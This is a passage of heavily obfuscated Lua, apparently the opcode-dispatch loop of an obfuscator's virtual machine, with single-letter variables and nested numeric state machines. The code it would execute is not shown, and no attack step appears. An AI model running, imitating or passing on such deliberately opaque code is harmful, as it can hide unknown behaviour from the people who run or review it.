bb=y[716]end else if not(ba==25)then w[bb]=w[bb](r(w,(bb+1),y[424]))else break end end end end end ba=ba+1 end end;elseif(95>z or 95==z)then w[y[716]]=b(d[y[424]],nil,j);elseif not(not(97~=z))then local ba=0 while true do if(ba<=9)then if(ba<=4)then if(ba==1 or ba<1)then if(ba<1)then w[y[716]][y[424]]=y[676];else n=(n+1);end else if(ba<2 or ba==2)then y=f[n];else if(ba<4)then w[y[716]]={};else n=n+1;end end end else if ba<=6 then if not(ba==6)then y=f[n];else w[y[716]][y[424]]=w[y[676]];end else if(ba<=7)then n=(n+1);else if 9~=ba then y=f[n];else w[y[716]]=h[y[424]];end end end end else if ba<=14 then if(ba==11 or ba<11)then if not(10~=ba)then n=(n+1);else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][y[676]];else if(13<ba)then y=f[n];else n=(n+1);end end end else if(ba==16 or ba<16)then if(ba~=16)then w[y[716]][y[424]]=w[y[676]];else n=n+1;end else if(ba<=17)then y=f[n];else if not(18~=ba)then w[y[716]][y[424]]=w[y[676]];else break end end end end end ba=(ba+1)end else w[y[716]]=(w[y[424]]-y[676]);end;elseif z<=100 then if(98>=z)then w[y[716]]();elseif(100>z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[716]]=h[y[424]];else n=n+1;end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba~=16 then bd=y[716]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[716]]=w[y[424]][y[676]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=6 then y=f[n];else if ba<8 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba<10 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[716]else if ba~=18 then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif z<=101 then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end else if ba<=4 then if 3==ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if 6~=ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if ba~=8 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 9==ba then y=f[n];else w[y[716]]=w[y[424]]*y[676];end end else if ba<=12 then if 11==ba then n=n+1;else y=f[n];end else if ba~=14 then w[y[716]]=w[y[424]]+w[y[676]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if 15<ba then w[y[716]]=j[y[424]];else y=f[n];end else if 17==ba then n=n+1;else y=f[n];end end else if ba<=20 then if ba>19 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if ba~=22 then y=f[n];else w[y[716]]=w[y[424]];end end end else if ba<=26 then if ba<=24 then if ba<24 then n=n+1;else y=f[n];end else if ba>25 then n=n+1;else w[y[716]]=w[y[424]]+w[y[676]];end end else if ba<=28 then if 28~=ba then y=f[n];else bb=y[716]end else if 30~=ba then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end end ba=ba+1 end elseif not(102~=z)then w[y[716]]=j[y[424]];else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[716]]=w[y[424]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[716]]=y[424];end else if ba~=7 then y=f[n];else w[y[716]]=y[424];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if 10==ba then w[y[716]]=y[424];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[716]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end ba=ba+1 end end;elseif z<=109 then if 106>=z then if 104>=z then w[y[716]]=w[y[424]];elseif 105==z then h[y[424]]=w[y[716]];else w[y[716]]=y[424]*w[y[676]];end;elseif z<=107 then local ba;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif 108<z then do return w[y[716]]end else local ba=y[716]local bb={w[ba](r(w,ba+1,y[424]))};local bc=0;for bd=ba,y[676]do bc=bc+1;w[bd]=bb[bc];end;end;elseif 112>=z then if z<=110 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=false;n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];for bb=y[716],y[424],1 do w[bb]=nil;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](w[ba+1])elseif z==111 then local ba;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba]()else local ba;local bb,bc;local bd;w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];bd=y[716]bb,bc=i(w[bd](r(w,bd+1,y[424])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif 113>=z then local ba;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif 114==z then local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](w[ba+1])else local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](w[ba+1])end;elseif z<=127 then if 121>=z then if z<=118 then if 116>=z then a(c,e);elseif 118~=z then w[y[716]]();else w[y[716]]=w[y[424]]/y[676];end;elseif z<=119 then w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];if(w[y[716]]~=y[676])then n=n+1;else n=y[424];end;elseif z<121 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]w[ba](w[ba+1])else w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;end;elseif 124>=z then if 122>=z then local ba=y[716]w[ba]=w[ba](w[ba+1])elseif z==123 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba]()end;elseif z<=125 then local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif z==126 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[716]w[ba]=w[ba]()end;elseif 133>=z then if 130>=z then if(z<128 or z==128)then local ba,bb=0 while true do if(ba<=10)then if(ba<4 or ba==4)then if(ba<=1)then if ba>0 then w[y[716]]=j[y[424]];else bb=nil end else if(ba==2 or ba<2)then n=n+1;else if(4>ba)then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if ba<=7 then if(ba<5 or ba==5)then n=(n+1);else if not(ba==7)then y=f[n];else w[y[716]]=y[424];end end else if(ba<8 or ba==8)then n=(n+1);else if(ba~=10)then y=f[n];else w[y[716]]=y[424];end end end end else if ba<=15 then if ba<=12 then if not(ba~=11)then n=n+1;else y=f[n];end else if(ba<=13)then w[y[716]]=y[424];else if 14==ba then n=n+1;else y=f[n];end end end else if(ba<18 or ba==18)then if(ba<=16)then w[y[716]]=y[424];else if ba>17 then y=f[n];else n=n+1;end end else if(ba<19 or ba==19)then bb=y[716]else if ba==20 then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end end ba=ba+1 end elseif not(z~=129)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[716]]=h[y[424]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 16>ba then bd=y[716]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[716]]=w[y[424]][y[676]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=13 then if ba<=10 then if ba>9 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end else if ba<=11 then n=n+1;else if ba>12 then w[y[716]]=false;else y=f[n];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[716]else if 18~=ba then w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif z<=131 then local ba,bb,bc,bd=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then bc=nil else bd=nil end end else if ba<=4 then if 4>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba>5 then w[y[716]]=h[y[424]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if 13>ba then w[y[716]]=w[y[424]][w[y[676]]];else n=n+1;end end end end else if ba<=20 then if ba<=16 then if ba<=14 then y=f[n];else if ba~=16 then w[y[716]]=h[y[424]];else n=n+1;end end else if ba<=18 then if 17==ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if 19==ba then n=n+1;else y=f[n];end end end else if ba<=24 then if ba<=22 then if ba~=22 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba==23 then y=f[n];else bd=y[424];end end else if ba<=26 then if 25<ba then bb=k(w,g,bd,bc);else bc=y[676];end else if ba==27 then w[y[716]]=bb;else break end end end end end ba=ba+1 end elseif 132<z then n=y[424];else local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba>1 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end end else if ba<=4 then if ba>3 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end else if ba>5 then y=f[n];else n=n+1;end end end else if ba<=10 then if ba<=8 then if 8~=ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 9==ba then y=f[n];else w[y[716]]=w[y[424]]*y[676];end end else if ba<=12 then if 12~=ba then n=n+1;else y=f[n];end else if ba~=14 then w[y[716]]=w[y[424]]+w[y[676]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if ba~=16 then y=f[n];else w[y[716]]=j[y[424]];end else if 18>ba then n=n+1;else y=f[n];end end else if ba<=20 then if ba<20 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 21==ba then y=f[n];else w[y[716]]=w[y[424]];end end end else if ba<=26 then if ba<=24 then if ba>23 then y=f[n];else n=n+1;end else if ba==25 then w[y[716]]=w[y[424]]+w[y[676]];else n=n+1;end end else if ba<=28 then if ba>27 then bb=y[716]else y=f[n];end else if ba<30 then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end end ba=ba+1 end end;elseif 136>=z then if z<=134 then for ba=y[716],y[424],1 do w[ba]=nil;end;elseif 136>z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](w[ba+1])else local ba=y[716]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[676]do bc=bc+1;w[bd]=bb[bc];end end;elseif z<=137 then local ba;w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif 139~=z then w[y[716]]=w[y[424]]%y[676];else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end;elseif 162>=z then if z<=150 then if 144>=z then if z<=141 then if z>140 then local ba=y[716];w[ba]=w[ba]-w[ba+2];n=y[424];else local ba=y[716];local bb=w[y[424]];w[ba+1]=bb;w[ba]=bb[w[y[676]]];end;elseif z<=142 then w[y[716]][w[y[424]]]=w[y[676]];elseif 144>z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba=y[716]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[676]do bc=bc+1;w[bd]=bb[bc];end end;elseif 147>=z then if z<=145 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end elseif z<147 then w[y[716]]={};else local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[424];bb=y[676];ba=k(w,g,bc,bb);w[y[716]]=ba;end;elseif 148>=z then w[y[716]]=w[y[424]]-y[676];elseif 150~=z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=156 then if(153>z or 153==z)then if 151>=z then if(not(w[y[716]]==w[y[676]]))then n=n+1;else n=y[424];end;elseif(153>z)then w[y[716]]=w[y[424]]%w[y[676]];else local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then bc=nil else w[y[716]]={};end end else if ba<=3 then n=n+1;else if 5>ba then y=f[n];else w[y[716]]=h[y[424]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7<ba then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end else if ba<=9 then n=n+1;else if 10<ba then w[y[716]]=h[y[424]];else y=f[n];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba~=14 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if ba<=15 then n=n+1;else if 16<ba then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if ba<=20 then if ba<=18 then n=n+1;else if 20>ba then y=f[n];else w[y[716]]={};end end else if ba<=22 then if ba==21 then n=n+1;else y=f[n];end else if 23==ba then w[y[716]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if ba~=27 then w[y[716]]=h[y[424]];else n=n+1;end end else if ba<=28 then y=f[n];else if ba~=30 then w[y[716]][y[424]]=w[y[676]];else n=n+1;end end end else if ba<=33 then if ba<=31 then y=f[n];else if 33>ba then w[y[716]]=h[y[424]];else n=n+1;end end else if ba<=35 then if ba<35 then y=f[n];else w[y[716]][y[424]]=w[y[676]];end else if ba~=37 then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[716]][y[424]]=w[y[676]];else if ba~=40 then n=n+1;else y=f[n];end end else if ba<=41 then w[y[716]]={r({},1,y[424])};else if ba~=43 then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[716]]=w[y[424]];else if 46>ba then n=n+1;else y=f[n];end end else if ba<=48 then if 47==ba then bc=y[716];else bb=w[bc];end else if 49==ba then for bd=bc+1,y[424]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end end;elseif(154>z or 154==z)then local ba,bb,bc,bd=0 while true do if(ba<=9)then if(ba<=4)then if(ba<1 or ba==1)then if not(ba~=0)then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[716]]=j[y[424]];else n=n+1;end end end else if ba<=6 then if ba>5 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end else if(ba<7 or ba==7)then n=(n+1);else if(ba>8)then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end end else if(ba<=14)then if(ba<=11)then if not(11==ba)then n=(n+1);else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][y[676]];else if(ba~=14)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if(16>ba)then bd=y[716]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if 18<ba then break else for be=bd,y[676]do bb=(bb+1);w[be]=bc[bb];end end end end end end ba=ba+1 end elseif(z>155)then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 3~=ba then y=f[n];else w[y[716]][y[424]]=w[y[676]];end end else if ba<=5 then if ba~=5 then n=n+1;else y=f[n];end else if 7>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba==8 then y=f[n];else w[y[716]]=h[y[424]];end else if ba==10 then n=n+1;else y=f[n];end end else if ba<=13 then if ba<13 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=14 then y=f[n];else if 16~=ba then if(w[y[716]]~=w[y[676]])then n=n+1;else n=y[424];end;else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[716]]=h[y[424]];else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if ba>8 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 15==ba then bd=y[716]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif z<=159 then if 157>=z then local ba;local bb;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={r({},1,y[424])};n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];bb=y[716];ba=w[bb];for bc=bb+1,y[424]do t(ba,w[bc])end;elseif 159~=z then local ba;w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba]()end;elseif z<=160 then local ba=y[716];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;elseif 161<z then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=174 then if z<=168 then if 165>=z then if 163>=z then w[y[716]]=(w[y[424]]%y[676]);elseif 165>z then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[424];bb=y[676];ba=k(w,g,bc,bb);w[y[716]]=ba;else w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;end;elseif z<=166 then local ba=y[716]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end elseif z==167 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]]+y[676];n=n+1;y=f[n];h[y[424]]=w[y[716]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;else local ba=y[716];local bb=w[y[424]];w[ba+1]=bb;w[ba]=bb[y[676]];end;elseif z<=171 then if 169>=z then local ba=y[424];local bb=y[676];local ba=k(w,g,ba,bb);w[y[716]]=ba;elseif 170<z then local ba;local bb;local bc;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[716];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;end;elseif z<=172 then if(y[716]<w[y[676]])then n=n+1;else n=y[424];end;elseif 173<z then local q;local x;local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end else 